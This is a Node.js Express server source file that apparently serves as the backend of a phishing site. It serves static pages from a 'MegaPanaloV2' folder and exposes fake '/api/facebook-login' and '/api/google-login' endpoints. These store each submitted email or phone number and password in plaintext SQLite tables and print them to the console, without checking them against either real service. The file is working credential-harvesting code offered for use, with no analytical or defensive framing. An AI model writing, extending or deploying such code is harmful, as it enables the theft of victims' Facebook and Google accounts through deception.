const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const app = express();
const db = new sqlite3.Database('users.db');

// Middleware to parse JSON request bodies
app.use(express.json());

// Serve static files from the "MegaPanaloV2" folder
app.use(express.static('MegaPanaloV2'));

// Root route
app.get('/', (req, res) => {
  res.sendFile(__dirname + '/MegaPanaloV2/Assets(SRC)/index.html');
});

// Create database tables if they don't exist
db.serialize(() => {
  db.run(`
    CREATE TABLE IF NOT EXISTS facebook_users (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      emailOrPhone TEXT,
      password TEXT
    )
  `);

  db.run(`
    CREATE TABLE IF NOT EXISTS google_users (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      email TEXT,
      password TEXT
    )
  `);
});

// Facebook login endpoint
app.post('/api/facebook-login', (req, res) => {
  const { emailOrPhone, password } = req.body;

  if (!emailOrPhone || !password) {
    return res.status(400).send('Email/Phone and password are required');
  }

  db.run(
    "INSERT INTO facebook_users (emailOrPhone, password) VALUES (?, ?)",
    [emailOrPhone, password],
    (err) => {
      if (err) {
        console.error('Error saving Facebook login:', err);
        return res.status(500).send('Error saving Facebook login');
      }
      console.log('Facebook login logged:', { emailOrPhone, password });
      res.sendStatus(200);
    }
  );
});

// Google login endpoint
app.post('/api/google-login', (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).send('Email and password are required');
  }

  db.run(
    "INSERT INTO google_users (email, password) VALUES (?, ?)",
    [email, password],
    (err) => {
      if (err) {
        console.error('Error saving Google login:', err);
        return res.status(500).send('Error saving Google login');
      }
      console.log('Google login logged:', { email, password });
      res.sendStatus(200);
    }
  );
});

// Start server
const PORT = 3000;
app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});